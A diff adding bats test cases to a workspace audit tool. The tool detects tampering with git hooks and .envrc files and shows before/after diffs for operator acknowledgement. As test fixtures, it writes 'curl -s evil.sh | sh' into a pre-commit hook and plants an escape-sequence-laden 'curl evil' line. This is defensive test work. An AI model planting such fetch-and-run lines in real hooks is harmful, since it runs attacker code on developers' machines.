@@ -1061,7 +1061,7 @@ no_sidecar() { rm -rf "$AUDITDIR"/*/*.d; }
     cmp_ >/dev/null
     no_sidecar
     run bash -c "printf 'q\n' | '$AUDIT' ack '$WS'"
-    after_marker="${output#*--- current content ---}"
+    after_marker="${output#*--- no pre-session record; current content ---}"
     [ "$after_marker" != "$output" ]
     [[ "$after_marker" == *"/tmp/evil"* ]]
 }
@@ -1533,4 +1533,78 @@ sidecar() { local r; r="$(find "$AUDITDIR" -name '*.txt' | sort | tail -1)"; r="
     [ -f "$f.new" ]
     [ ! -s "$f.new" ]
     [ ! -e "$f.diff" ]
+}
+
+# --- issue #57: the prompt shows the retained diff ---
+
+@test "ack shows a before/after diff for a modified surface" {
+    mkdir -p "$WS/.git/hooks"
+    printf '#!/bin/sh\nexec make lint\n' > "$WS/.git/hooks/pre-commit"
+    snap
+    printf '#!/bin/sh\nexec make lint\ncurl -s evil.sh | sh\n' > "$WS/.git/hooks/pre-commit"
+    cmp_ >/dev/null
+    run bash -c "printf 'q\n' | '$AUDIT' ack '$WS'"
+    [[ "$output" == *"before (pre-session)"* ]]
+    [[ "$output" == *"+curl -s evil.sh | sh"* ]]
+}
+
+@test "ack labels a new surface as new and shows all of it" {
+    snap
+    printf 'export EVIL=1\n' > "$WS/.envrc"
+    cmp_ >/dev/null
+    run bash -c "printf 'q\n' | '$AUDIT' ack '$WS'"
+    [[ "$output" == *"new surface"* ]]
+    [[ "$output" == *"export EVIL=1"* ]]
+}
+
+@test "ack explains why a denylisted surface has no diff, and still shows it" {
+    # The tension worth being explicit about: .envrc is a CRITICAL surface, so
+    # this is a finding where a diff would help most. The operator can still
+    # decide - the live content is on their own terminal - but the persistent
+    # store goes without.
+    printf 'export TOKEN=old\n' > "$WS/.envrc"
+    snap
+    printf 'export TOKEN=hunter2\n' > "$WS/.envrc"
+    cmp_ >/dev/null
+    run bash -c "printf 'q\n' | '$AUDIT' ack '$WS'"
+    [[ "$output" == *"secret-bearing"* ]]
+    [[ "$output" == *"hunter2"* ]]
+}
+
+@test "a control character planted in a diff is stripped before display" {
+    mkdir -p "$WS/.git/hooks"
+    printf '#!/bin/sh\n' > "$WS/.git/hooks/pre-commit"
+    snap
+    printf '#!/bin/sh\n\033[2Jcurl evil\n' > "$WS/.git/hooks/pre-commit"
+    cmp_ >/dev/null
+    run bash -c "printf 'q\n' | '$AUDIT' ack '$WS'"
+    [[ "$output" == *"curl evil"* ]]
+    [[ "$output" != *$'\033'* ]]
+}
+
+@test "acknowledging a finding removes its retained diff" {
+    # The diff existed to inform a decision that has now been made. An
+    # unacknowledged CRITICAL report is retained indefinitely by design; its
+    # diff should not be.
+    mkdir -p "$WS/.git/hooks"
+    printf 'a\n' > "$WS/.git/hooks/pre-commit"
+    snap
+    printf 'b\n' > "$WS/.git/hooks/pre-commit"
+    cmp_ >/dev/null
+    sc="$(sidecar)"
+    [ -f "$sc/$(key_of '.git/hooks/pre-commit').diff" ]
+    run bash -c "printf 'a\n' | '$AUDIT' ack '$WS'"
+    [[ "$output" == *"recorded 1 acknowledgement"* ]]
+    [ ! -e "$sc/$(key_of '.git/hooks/pre-commit').diff" ]
+}
+
+@test "quitting ack leaves the retained diffs in place" {
+    mkdir -p "$WS/.git/hooks"
+    printf 'a\n' > "$WS/.git/hooks/pre-commit"
+    snap
+    printf 'b\n' > "$WS/.git/hooks/pre-commit"
+    cmp_ >/dev/null
+    sc="$(sidecar)"
+    run bash -c "printf 'q\n' | '$AUDIT' ack '$WS'"
+    [ -f "$sc/$(key_of '.git/hooks/pre-commit').diff" ]
 }
